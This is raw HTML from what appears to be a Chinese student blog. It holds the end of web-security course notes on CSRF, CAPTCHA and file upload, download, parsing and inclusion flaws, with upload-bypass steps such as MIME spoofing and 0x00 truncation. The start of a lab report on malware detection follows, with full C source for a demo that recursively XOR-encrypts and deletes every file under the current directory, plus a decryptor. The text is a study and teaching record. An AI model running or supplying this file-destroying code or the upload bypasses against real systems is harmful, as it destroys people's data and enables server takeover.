</li>
<li><p>实现步骤：</p>
<ol>
<li><p>修改<code>do_adduser.php</code>文件，添加Referer验证函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_referrer</span>(<span class="params"><span class="variable">$referer</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>] !== <span class="variable">$referer</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Invalid request source&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">check_referrer</span>(<span class="string">&#x27;http://localhost/csrf/newuser.html&#x27;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>重复CSRF攻击测试，验证攻击失败。</p>
</li>
</ol>
</li>
<li><p>优缺点：</p>
<ul>
<li>优点：有效拦截非正常来源的请求。</li>
<li>缺点：依赖于浏览器的Referer字段支持，部分浏览器可能关闭此字段。</li>
</ul>
</li>
</ul>
<p><strong>防护方法2：操作确认对话框</strong></p>
<ul>
<li>原理：<ul>
<li>在敏感操作前弹出确认对话框，用户手动确认操作真实性。</li>
</ul>
</li>
<li>实现步骤：<ol>
<li>修改<code>do_adduser.php</code>文件，添加操作确认提示。</li>
<li>当用户点击恶意链接时，弹出提示，选择“否”可阻止伪造操作。</li>
</ol>
</li>
<li>优缺点：<ul>
<li>优点：阻止用户误操作。</li>
<li>缺点：用户可能忽略提示直接确认。</li>
</ul>
</li>
</ul>
<p><strong>其他防护方法</strong>：</p>
<ul>
<li>使用Token验证：<ul>
<li>在表单中嵌入唯一Token，提交请求时验证Token是否合法。</li>
<li>缺点：攻击者可通过先访问合法表单获取Token后再发起伪造请求。</li>
</ul>
</li>
<li>设置Cookie的<code>HttpOnly</code>属性：<ul>
<li>阻止JavaScript访问Cookie，减少SessionID被窃取的风险。</li>
</ul>
</li>
</ul>
<h4 id="项目12-验证码"><a href="#项目12-验证码" class="headerlink" title="项目12 验证码"></a>项目12 验证码</h4><ul>
<li><p>原理：利用验证码，通过人工识别的方式，防止自动化工具进行密码破解等恶意攻击。</p>
</li>
<li><p>概念：验证码、CAPTCHA、OCR、机器学习、在线暴力攻击、人机识别。</p>
</li>
</ul>
<h5 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h5><ol>
<li><strong>Web登录密码暴力破解原理</strong>：<ul>
<li>暴力破解方法：利用字典枚举所有可能的用户名和密码组合，逐一尝试登录。</li>
<li>自动化工具：通过软件模拟HTTP登录请求，检查服务器返回信息确认登录是否成功。</li>
<li>常用工具：<strong>Hydra</strong>，支持多种协议的在线密码暴力破解工具。</li>
</ul>
</li>
<li><strong>验证码的作用</strong>：<ul>
<li>验证码（CAPTCHA）是“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序。验证码用于区分计算机与人类用户，防止自动化攻击。</li>
<li>常见用途：<ul>
<li>防止密码暴力破解。</li>
<li>防止自动化批量注册。</li>
<li>防止恶意搜索和刷票等活动。</li>
</ul>
</li>
</ul>
</li>
<li><strong>验证码设计要点</strong>：<ul>
<li>服务器端生成验证码，确保无法通过客户端伪造。</li>
<li>验证码需有有效期和使用限制，避免重复使用。</li>
<li>验证码复杂度需平衡安全性与用户体验。</li>
</ul>
</li>
<li><strong>验证码面临的挑战</strong>：<ul>
<li>OCR（光学字符识别）技术和机器学习的发展使简单验证码易被破解。</li>
<li>图片滑动验证（如阿里云）和reCAPTCHA等复杂验证方式是应对现代攻击的主流方案。</li>
</ul>
</li>
</ol>
<h5 id="拓展思考"><a href="#拓展思考" class="headerlink" title="拓展思考"></a>拓展思考</h5><ol>
<li><strong>哪些功能需要验证码？</strong><ul>
<li>登录页面、防止暴力破解。</li>
<li>用户注册、防止批量注册。</li>
<li>敏感操作（如密码重置、防止账户盗用）。</li>
</ul>
</li>
<li><strong>验证码能否杜绝自动化攻击？</strong><ul>
<li>验证码难以完全杜绝自动化攻击，但能大幅提高攻击成本。</li>
<li>强化验证码方案（如短信验证、滑动验证）是更安全的选择。</li>
</ul>
</li>
<li><strong>如何应对高级攻击？</strong><ul>
<li>结合多因素认证（如动态口令、硬件令牌）。</li>
<li>监控异常登录行为并触发额外验证。</li>
</ul>
</li>
</ol>
<h3 id="第四篇-文件漏洞及防护"><a href="#第四篇-文件漏洞及防护" class="headerlink" title="第四篇 文件漏洞及防护"></a>第四篇 文件漏洞及防护</h3><h4 id="项目13-文件上传漏洞"><a href="#项目13-文件上传漏洞" class="headerlink" title="项目13 文件上传漏洞"></a>项目13 文件上传漏洞</h4><ul>
<li><p>原理：利用文件上传漏洞，上传恶意文件，获取服务器权限，甚至控制整个系统。</p>
</li>
<li><p>概念：文件上传漏洞、MIME 类型检测、文件类型过滤、0x00 截断、文件解析漏洞、白名单过滤、黑名单过滤。</p>
</li>
</ul>
<h5 id="基础知识-2"><a href="#基础知识-2" class="headerlink" title="基础知识"></a>基础知识</h5><ol>
<li><strong>文件上传漏洞概述</strong>：<ul>
<li>文件上传是Web系统中常见功能，但由于控制不严格，攻击者可能通过漏洞上传恶意文件（如网页木马），实现对服务器的控制。</li>
<li>主要的文件上传漏洞类型：<ul>
<li><strong>MIME类型检测绕过</strong>。</li>
<li><strong>文件类型过滤不严格</strong>。</li>
<li><strong>文件名/路径0x00截断漏洞</strong>。</li>
</ul>
</li>
</ul>
</li>
<li><strong>常见文件上传漏洞类型</strong>：<ul>
<li>MIME文件上传漏洞：<ul>
<li>MIME（多用途互联网邮件扩展类型）通过HTTP协议为文件提供数据格式标识。</li>
<li>攻击方式：利用抓包工具修改文件的MIME类型，绕过服务器检测。</li>
</ul>
</li>
<li>文件类型过滤不严格：<ul>
<li>文件扩展名检查时未考虑大小写或未严格匹配。</li>
<li>例如：通过<code>.Php</code>绕过<code>.php</code>过滤规则。</li>
</ul>
</li>
<li>文件名/路径0x00截断漏洞：<ul>
<li>利用0x00（空字符）的截断特性，使服务器保存的文件名被截断。</li>
<li>例：文件名<code>1.php 0x00 abc.jpg</code>在某些低版本PHP中被保存为<code>1.php</code>。</li>
</ul>
</li>
</ul>
</li>
</ol>
<h5 id="文件上传漏洞攻击测试"><a href="#文件上传漏洞攻击测试" class="headerlink" title="文件上传漏洞攻击测试"></a>文件上传漏洞攻击测试</h5><ol>
<li><strong>工具选择</strong>：<ul>
<li>使用Fiddler进行抓包和HTTP数据包编辑。</li>
<li>其他抓包工具（如Burp Suite、Wireshark）也可用于类似测试。</li>
</ul>
</li>
<li><strong>漏洞攻击类型</strong>：<ul>
<li><strong>MIME文件上传漏洞</strong>：<ul>
<li>步骤：<ol>
<li>创建一个<code>.php</code>文件（如<code>info.php</code>），测试直接上传是否被服务器阻止。</li>
<li>使用Fiddler抓包，修改文件的MIME类型为允许的类型（如<code>image/jpeg</code>）。</li>
<li>重放修改后的请求，成功绕过文件类型检测，上传<code>.php</code>文件。</li>
<li>通过浏览器访问上传的<code>.php</code>文件，确认被服务器解析。</li>
</ol>
</li>
<li>原理：服务器通过<code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code>读取MIME类型，容易被抓包工具篡改。</li>
</ul>
</li>
<li><strong>0x00截断路径上传漏洞</strong>：<ul>
<li>步骤：<ol>
<li>将<code>.php</code>文件改名为<code>.jpg</code>，上传时使用Fiddler抓包。</li>
<li>在上传路径中插入<code>0x00</code>（空字符），如<code>1.php0x00info.jpg</code>。</li>
<li>重放修改后的请求，成功将文件保存为<code>.php</code>类型，并利用漏洞访问。</li>
</ol>
</li>
<li>原理：低版本PHP中未对路径合法性进行严格检查，<code>0x00</code>之后的内容会被截断。</li>
</ul>
</li>
</ul>
</li>
<li><strong>攻击分析</strong>：<ul>
<li>MIME类型检测不可靠，易被抓包工具修改绕过。</li>
<li>文件名/路径的<code>0x00</code>截断漏洞在低版本PHP中存在，但高版本PHP已修复。</li>
</ul>
</li>
</ol>
<h5 id="文件上传漏洞防护"><a href="#文件上传漏洞防护" class="headerlink" title="文件上传漏洞防护"></a>文件上传漏洞防护</h5><ol>
<li><strong>防护方法</strong>：<ul>
<li>判断路径变量：<ul>
<li>使用路径白名单机制，限制路径变量为预定义的合法值。</li>
<li>在低版本PHP中，可有效防护路径截断攻击。</li>
</ul>
</li>
<li>文件重命名：<ul>
<li>上传文件时，重新生成唯一文件名，并以白名单中允许的扩展名保存。</li>
<li>优点：防止文件名截断和超长文件名攻击。</li>
<li>缺点：无法防止路径截断问题。</li>
</ul>
</li>
<li>设置非Web目录保存文件：<ul>
<li>将上传文件存储在非Web目录下（如<code>C:\uploads</code>），避免直接访问上传文件。</li>
<li>使用<code>readfile()</code>函数读取文件内容并提供下载。</li>
</ul>
</li>
</ul>
</li>
<li><strong>防护效果测试</strong>：<ul>
<li>升级PHP版本后，确认<code>0x00</code>路径截断漏洞修复。</li>
<li>针对MIME检测绕过，验证文件扩展名过滤的可靠性。</li>
<li>测试非Web目录方案，确保文件无法直接通过URL访问。</li>
</ul>
</li>
</ol>
<h5 id="拓展思考-1"><a href="#拓展思考-1" class="headerlink" title="拓展思考"></a>拓展思考</h5><ol>
<li><strong>如何利用0x00截断攻击上传文件？</strong><ul>
<li>在上传路径中插入<code>0x00</code>字符，截断路径或文件名以实现攻击。</li>
<li>示例路径：<code>uploads/1.php0x00info.jpg</code>。</li>
</ul>
</li>
<li><strong>如何使用黑名单过滤文件上传？</strong><ul>
<li>列出所有不允许的文件扩展名（如<code>.php</code>、<code>.exe</code>）。</li>
<li>缺点：无法穷尽所有可能的恶意扩展名，不如白名单可靠。</li>
</ul>
</li>
</ol>
<h4 id="项目14-文件下载漏洞"><a href="#项目14-文件下载漏洞" class="headerlink" title="项目14 文件下载漏洞"></a>项目14 文件下载漏洞</h4><ul>
<li><p>原理：利用文件下载漏洞，下载服务器中的敏感信息，例如数据库、配置文件等。</p>
</li>
<li><p>概念：文件下载漏洞、open_basedir 安全选项、正则表达式过滤、路径参数过滤。</p>
</li>
</ul>
<p><strong>定义</strong>：攻击者通过漏洞下载服务器中的敏感文件</p>
<p><strong>防护方法</strong></p>
<ol>
<li>使用<code>open_basedir</code>限制PHP脚本访问目录</li>
<li>使用正则表达式过滤路径参数</li>
<li>验证并限制用户输入的路径参数</li>
</ol>
<h4 id="项目15-文件解析漏洞"><a href="#项目15-文件解析漏洞" class="headerlink" title="项目15 文件解析漏洞"></a>项目15 文件解析漏洞</h4><ul>
<li><p>原理：利用 Apache 服务器的文件解析漏洞，绕过文件类型限制，上传 PHP 木马文件，获取服务器权限。</p>
</li>
<li><p>概念：文件解析漏洞、Apache 解析特性、.htaccess 文件、文件类型限制、危险函数。</p>
</li>
</ul>
<p><strong>定义</strong>：绕过文件类型限制，上传并解析恶意文件获取服务器权限</p>
<p><strong>防护方法</strong></p>
<ol>
<li>使用<code>.htaccess</code>限制文件解析类型</li>
<li>严格文件类型检查，允许特定类型</li>
<li>禁用危险函数（如<code>exec()</code>, <code>system()</code>）</li>
</ol>
<h4 id="项目16-文件包含漏洞"><a href="#项目16-文件包含漏洞" class="headerlink" title="项目16 文件包含漏洞"></a>项目16 文件包含漏洞</h4><ul>
<li><p>原理：利用文件包含漏洞，包含服务器中的非法文件，执行恶意代码，获取服务器权限。</p>
</li>
<li><p>概念：文件包含漏洞、open_basedir 安全选项、正则表达式过滤、文件名过滤。</p>
</li>
<li><p><strong>定义</strong>：通过包含非法文件执行恶意代码，获取服务器权限</p>
</li>
<li>防护方法<ol>
<li>使用<code>open_basedir</code>限制包含文件目录</li>
<li>使用正则表达式过滤文件名</li>
<li>仅允许特定文件名或路径包含</li>
</ol>
</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="moyuan">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moyuan"s website">
      <meta itemprop="description" content="prograing or coffee">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Moyuan"s website">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/" class="post-title-link" itemprop="url">实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-12-13 01:05:14" itemprop="dateCreated datePublished" datetime="2024-12-13T01:05:14+08:00">2024-12-13</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-01-05 19:56:41" itemprop="dateModified" datetime="2025-01-05T19:56:41+08:00">2025-01-05</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究"><a href="#实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究" class="headerlink" title="实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究"></a>实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究</h3><h4 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h4><p>随着信息技术的迅猛发展，计算机病毒的种类和数量不断增加，给信息安全带来了严峻挑战。传统的病毒检测方法主要依赖特征码和启发式分析，但在应对新型和变种病毒时效果有限。机器学习和深度学习作为现代人工智能的重要分支，提供了新的解决方案。恶意程序是网络安全的重要威胁，其中勒索病毒尤为严重，通过加密受害者文件索取赎金。本实验分三个部分：</p>
<ol>
<li>设计一个简单的勒索病毒Demo，了解恶意程序的基本行为。</li>
<li>利用机器学习方法检测恶意程序。</li>
<li>利用深度学习方法检测并分类恶意程序。</li>
</ol>
<h4 id="第一部分：勒索病毒Demo设计"><a href="#第一部分：勒索病毒Demo设计" class="headerlink" title="第一部分：勒索病毒Demo设计"></a>第一部分：勒索病毒Demo设计</h4><h5 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a><strong>实验目的</strong></h5><p>利用ChatGPT实现一个勒索病毒的简化模型，模拟文件加密与解密流程，探究恶意程序的行为特征。</p>
<h5 id="技术实现"><a href="#技术实现" class="headerlink" title="技术实现"></a><strong>技术实现</strong></h5><ol>
<li>加密功能：<ul>
<li>遍历当前目录及子目录中的所有文件。</li>
<li>使用简单的异或加密算法(<code>XOR</code>)加密文件内容，并将加密后的文件扩展名改为<code>.exe</code>。</li>
<li>删除原始文件，保留加密后的文件。</li>
</ul>
</li>
<li>解密功能：<ul>
<li>遍历加密文件，使用相同的<code>XOR</code>解密逻辑还原原始文件。</li>
<li>删除加密文件，恢复文件原始状态。</li>
</ul>
</li>
</ol>
<h5 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a><strong>代码逻辑</strong></h5><ul>
<li>文件遍历：使用Windows API递归遍历文件夹。</li>
<li>文件操作：基于<code>FILE*</code>文件指针读写文件。</li>
</ul>
<h5 id="安全注意事项"><a href="#安全注意事项" class="headerlink" title="安全注意事项"></a><strong>安全注意事项</strong></h5><ul>
<li><strong>仅供学习使用</strong>，禁止用于任何非法目的。</li>
<li><p>所有操作应限制在“测试文件夹”中，避免误操作导致数据丢失。</p>
<p><code>encode-main.cpp</code>：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line">#include&quot;funcs.h&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    char buff[MAX_PATH];</span><br><span class="line">    GetCurrentDirectory(MAX_PATH, buff);</span><br><span class="line">    findFile(buff);</span><br><span class="line">    printf(&quot;Oh, ho, you got it\n&quot;);</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  <code>encode-funcs.cpp</code>：</p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#include&quot;funcs.h&quot;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">void findFile(char* pathName) &#123;</span><br><span class="line">    char currFile[MAX_PATH]; // 暂时存储每个文件名</span><br><span class="line">    memset(currFile, 0, MAX_PATH);</span><br><span class="line">    sprintf(currFile, &quot;%s\\*.*&quot;, pathName);</span><br><span class="line">    _WIN32_FIND_DATAA findData;</span><br><span class="line">    HANDLE hFile = FindFirstFile(currFile, &amp;findData);</span><br><span class="line">    if (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    int ret = 0;</span><br><span class="line">    while (1) &#123;</span><br><span class="line">        memset(currFile, 0, MAX_PATH);</span><br><span class="line">        sprintf(currFile, &quot;%s\\%s&quot;, pathName, findData.cFileName);</span><br><span class="line">        // 检查文件属性--文件还是文件夹？</span><br><span class="line">        if (findData.cFileName[0] == &#x27;.&#x27;); //对特殊文件夹不进行处理</span><br><span class="line">        else if ((findData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY))  //如果是普通文件夹，递归调用findFile函数</span><br><span class="line">            findFile(currFile);</span><br><span class="line">        else //否则，处理当前文件</span><br><span class="line">            enCode(currFile);</span><br><span class="line">        </span><br><span class="line">        ret = FindNextFile(hFile, &amp;findData);</span><br><span class="line">        if (!ret)</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void enCode(char* pathFile) &#123;</span><br><span class="line">    //打开待加密文件，创建加密后文件</span><br><span class="line">    FILE* fpSrc = fopen(pathFile, &quot;rb&quot;); //只读字节流</span><br><span class="line">    char buff[MAX_PATH];</span><br><span class="line">    sprintf(buff, &quot;%s.exe&quot;, pathFile);</span><br><span class="line">    FILE* fpDst = fopen(buff, &quot;wb&quot;); //只写字节流</span><br><span class="line">    </span><br><span class="line">    if (fpSrc == NULL || fpDst == NULL)</span><br><span class="line">        return;</span><br><span class="line">    //以单个字节循环读取待加密文件内容，并写入加密文件中</span><br><span class="line">    char currByte;</span><br><span class="line">    while (1) &#123;</span><br><span class="line">        int count = fread(&amp;currByte, 1, 1, fpSrc);</span><br><span class="line">        if (count &lt; 1) //没读到</span><br><span class="line">            break;</span><br><span class="line">        currByte ^= 0x66; //简单异或加密法</span><br><span class="line">        fwrite(&amp;currByte, 1, 1, fpDst); //写入加密文件</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fpSrc);</span><br><span class="line">    fclose(fpDst);</span><br><span class="line">    remove(pathFile); //删除原文件</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  <code>encode-funcs.h</code>：</p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#pragma once</span><br><span class="line">#pragma warning(disable : 4996)</span><br><span class="line"></span><br><span class="line">// 在指定路径下递归寻找所有文件</span><br><span class="line">void findFile(char* pathName);</span><br><span class="line"></span><br><span class="line">// 加密操作</span><br><span class="line">void enCode(char* pathFile);</span><br></pre></td></tr></table></figure>
<p>  <code>decode-main.cpp</code>：</p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line">#include&quot;funcs.h&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    char buff[MAX_PATH];</span><br><span class="line">    GetCurrentDirectory(MAX_PATH, buff);</span><br><span class="line">    findFile(buff);</span><br><span class="line">    printf(&quot;Oh, ho, all file recovered！\n&quot;);</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  <code>decode-funcs.cpp</code>：</p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">#include&quot;funcs.h&quot;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">void findFile(char* pathName) &#123;</span><br><span class="line">    char currFile[MAX_PATH]; // 暂时存储每个文件名</span><br><span class="line">    memset(currFile, 0, MAX_PATH);</span><br><span class="line">    sprintf(currFile, &quot;%s\\*.*&quot;, pathName);</span><br><span class="line">    _WIN32_FIND_DATAA findData;</span><br><span class="line">    HANDLE hFile = FindFirstFile(currFile, &amp;findData);</span><br><span class="line">    if (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    int ret = 0;</span><br><span class="line">    while (1) &#123;</span><br><span class="line">        memset(currFile, 0, MAX_PATH);</span><br><span class="line">        sprintf(currFile, &quot;%s\\%s&quot;, pathName, findData.cFileName);</span><br><span class="line">        // 检查文件属性--文件还是文件夹？</span><br><span class="line">        if (findData.cFileName[0] == &#x27;.&#x27;); //对特殊文件夹不进行处理</span><br><span class="line">        else if ((findData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY))  //如果是普通文件夹，递归调用findFile函数</span><br><span class="line">            findFile(currFile);</span><br><span class="line">        else //否则，处理当前文件(安全起见这里仅打印文件名)</span><br><span class="line">            deCode(currFile);</span><br><span class="line"></span><br><span class="line">        ret = FindNextFile(hFile, &amp;findData);</span><br><span class="line">        if (!ret)</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void deCode(char* pathFile) &#123;</span><br><span class="line">    //打开待解密文件，创建解密后文件</span><br><span class="line">    FILE* fpSrc = fopen(pathFile, &quot;rb&quot;); //只读字节流</span><br><span class="line">    char buff[MAX_PATH];</span><br><span class="line">    memset(buff, 0, MAX_PATH);</span><br><span class="line">    //去掉.exe后缀</span><br><span class="line">    if (dropEXE(pathFile, buff) != 0) //如果返回非0，则说明当前文件非.exe结尾，不进行解密处理</span><br><span class="line">        return;</span><br><span class="line">    FILE* fpDst = fopen(buff, &quot;wb&quot;); //只写字节流</span><br><span class="line">    if (fpSrc == NULL || fpDst == NULL)</span><br><span class="line">        return;</span><br><span class="line">    //以单个字节循环读取待解密文件内容，并写入解密文件中</span><br><span class="line">    char currByte;</span><br><span class="line">    while (1) &#123;</span><br><span class="line">        int count = fread(&amp;currByte, 1, 1, fpSrc);</span><br><span class="line">        if (count &lt; 1) //没读到</span><br><span class="line">            break;</span><br><span class="line">        currByte ^= 0x66; //简单异或解密法</span><br><span class="line">        fwrite(&amp;currByte, 1, 1, fpDst); //写入解密文件</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fpSrc);</span><br><span class="line">    fclose(fpDst);</span><br><span class="line">    printf(&quot;Congrat! %s recoveried successfully!\n&quot;, buff);</span><br><span class="line">    remove(pathFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int dropEXE(char* fpSrc, char* fpDst) &#123;</span><br><span class="line">    int n = strlen(fpSrc);</span><br><span class="line">    if (n &lt; 4)</span><br><span class="line">        return 1;</span><br><span class="line">    char check[5];</span><br><span class="line">    for (int i = 0; i &lt; 4; ++i)</span><br><span class="line">        check[i] = *(fpSrc + n - 4 + i);</span><br><span class="line">    check[4] = &#x27;\0&#x27;;</span><br><span class="line">    if (strcmp(check, &quot;.exe&quot;) != 0) &#123;</span><br><span class="line">        printf(&quot;sorry, %s is not a .exe file, recovery failed!\n&quot;, fpSrc);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    strncpy(fpDst, fpSrc, n - 4);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  <code>decode-funcs.h</code>：</p>
